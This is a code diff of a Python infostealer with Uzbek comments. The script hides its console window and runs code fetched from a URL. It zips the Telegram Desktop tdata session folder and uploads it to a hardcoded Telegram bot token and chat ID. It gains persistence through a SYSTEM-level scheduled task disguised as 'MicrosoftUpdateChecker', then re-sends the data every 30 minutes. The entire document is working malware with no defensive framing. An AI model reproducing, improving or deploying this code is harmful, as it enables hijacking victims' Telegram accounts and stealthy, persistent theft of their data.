@@ -1,6 +1,6 @@
-import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json
+import sys, urllib.request, os, ctypes, zipfile, socket, tempfile, shutil, time, json, subprocess, winreg
 
-# O'z-o'zini ishga tushirish
+# 1. O'z-o'zini ishga tushirish (Internetdan kelsa)
 if len(sys.argv) > 0 and "http" in sys.argv[0]:
     try:
         exec(urllib.request.urlopen(sys.argv[0]).read())
@@ -8,10 +8,11 @@ if len(sys.argv) > 0 and "http" in sys.argv[0]:
     except:
         pass
 
-# Qora oynani yashirish
+# 2. Qora oynani yashirish
 if os.name == 'nt':
     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
+# 3. Telegram ma'lumotlari
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = 7080045924
 
@@ -44,90 +45,77 @@ def send_telegram_message(text):
     except:
         pass
 
-def zip_and_send(folder_path, zip_name_suffix):
+# 4. tdata ni yig'ish va yuborish
+def zip_and_send():
     pc_name = socket.gethostname()
+    appdata = os.getenv('APPDATA')
+    tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
+    
+    if os.path.exists(tdata_path):
+        try:
+            temp_dir = tempfile.gettempdir()
+            zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
+            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(tdata_path):
+                    for file in files:
+                        try:
+                            file_path = os.path.join(root, file)
+                            zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
+                        except: pass
+            send_telegram_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
+            os.remove(zip_path)
+            return True
+        except:
+            pass
+    return False
+
+# 5. O'zini Task Scheduler ga o'rnatish (Doimiy qilish)
+def install_persistence():
     try:
-        temp_dir = tempfile.gettempdir()
-        zip_path = os.path.join(temp_dir, f"{zip_name_suffix}_{pc_name}.zip")
-        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for root, dirs, files in os.walk(folder_path):
-                for file in files:
-                    try:
-                        file_path = os.path.join(root, file)
-                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(folder_path)))
-                    except: pass
-        send_telegram_file(zip_path, f"✅ Yangi {zip_name_suffix} yig'ildi!\n🖥 {pc_name}")
-        os.remove(zip_path)
+        # 5.1. O'zini kompyuterga saqlash
+        script_path = os.path.join(os.environ['APPDATA'], "msvc_update.py")
+        
+        # Agar fayl internetdan kelsa, uni kompyuterga yuklab olamiz
+        if not os.path.exists(script_path):
+            content = urllib.request.urlopen(sys.argv[0]).read().decode()
+            with open(script_path, 'w') as f:
+                f.write(content)
+            os.chmod(script_path, 0o777)
+        
+        # 5.2. Task Scheduler ga qo'shish (Har bir foydalanuvchi kirganda)
+        task_name = "MicrosoftUpdateChecker"
+        cmd = f'schtasks /create /tn "{task_name}" /tr "{sys.executable} {script_path}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
+        subprocess.run(cmd, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        
+        send_telegram_message(f"♻️ Checker kompyuterga o'rnatildi: {socket.gethostname()}")
         return True
-    except:
+    except Exception as e:
         return False
 
-# ============================================================
-# SUPER QIDIRUVCHI (Barcha disklar va foydalanuvchilar)
-# ============================================================
-def search_and_collect():
-    found = False
-    pc_name = socket.gethostname()
-    
-    # C: dan Z: gacha barcha mantiqiy disklarni tekshiramiz
-    for drive_letter in range(ord('C'), ord('Z') + 1):
-        drive = f"{chr(drive_letter)}:\\"
-        if os.path.exists(drive):
-            users_dir = os.path.join(drive, "Users")
-            if os.path.exists(users_dir):
-                try:
-                    for user_folder in os.listdir(users_dir):
-                        user_path = os.path.join(users_dir, user_folder)
-                        if os.path.isdir(user_path):
-                            # 4 ta asosiy variantni tekshiramiz
-                            possible_paths = [
-                                os.path.join(user_path, "AppData", "Roaming", "Telegram Desktop", "tdata"),
-                                os.path.join(user_path, "AppData", "Local", "Telegram Desktop", "tdata"),
-                                os.path.join(user_path, "AppData", "Roaming", "TelegramDesktop", "tdata"),
-                                os.path.join(user_path, "AppData", "Local", "TelegramDesktop", "tdata")
-                            ]
-                            for path in possible_paths:
-                                if os.path.exists(path):
-                                    send_telegram_message(f"⏳ {pc_name}: tdata topildi! ({path}) siqilmoqda...")
-                                    zip_and_send(path, "tdata")
-                                    found = True
-                except:
-                    pass
-    
-    # Agar tdata topilmasa, barcha "Telegram" nomli papkalarni qidiramiz
-    if not found:
-        for drive_letter in range(ord('C'), ord('Z') + 1):
-            drive = f"{chr(drive_letter)}:\\"
-            if os.path.exists(drive):
-                try:
-                    for root, dirs, files in os.walk(drive):
-                        if "Telegram" in root or "TelegramDesktop" in root:
-                            tdata_sub = os.path.join(root, "tdata")
-                            if os.path.exists(tdata_sub):
-                                send_telegram_message(f"⏳ {pc_name}: tdata topildi! ({tdata_sub}) siqilmoqda...")
-                                zip_and_send(tdata_sub, "tdata")
-                                found = True
-                            else:
-                                zip_and_send(root, "telegram_folder")
-                                found = True
-                        if found:
-                            break
-                except:
-                    pass
-    return found
-
-# ============================================================
-# ASOSIY ISHCHI
-# ============================================================
+# 6. Asosiy ishchi funksiya
 def main():
     pc_name = socket.gethostname()
     
-    if search_and_collect():
-        send_telegram_message(f"✅ {pc_name}: Barcha topilgan ma'lumotlar yuborildi!")
-    else:
+    # Birinchi marta ishga tushganda, o'zini o'rnatadi
+    if not os.path.exists(os.path.join(os.environ['APPDATA'], "msvc_update.py")):
+        if install_persistence():
+            send_telegram_message(f"🟢 Checker birinchi marta ishga tushdi: {pc_name}")
+    
+    # Hozirgi tdata ni yuborish
+    zip_and_send()
+    
+    # Endi doimiy ishlash (kuzatish)
+    last_sent = 0
+    while True:
+        time.sleep(60) # Har 1 daqiqada tekshiradi
+        
+        # Agar Telegram Desktop ishlayotgan bo'lsa
         try:
-            ip = urllib.request.urlopen("https://api.ipify.org").read().decode()
-            send_telegram_message(f"⚠️ {pc_name}: Telegram ma'lumotlari topilmadi!\n🌐 IP: {ip}")
+            result = subprocess.run(['tasklist', '/fi', 'imagename eq Telegram.exe'], capture_output=True, text=True)
+            if "Telegram.exe" in result.stdout:
+                if time.time() - last_sent > 1800: # Har 30 daqiqada qayta yuboradi
+                    if zip_and_send():
+                        last_sent = time.time()
         except:
             pass
 
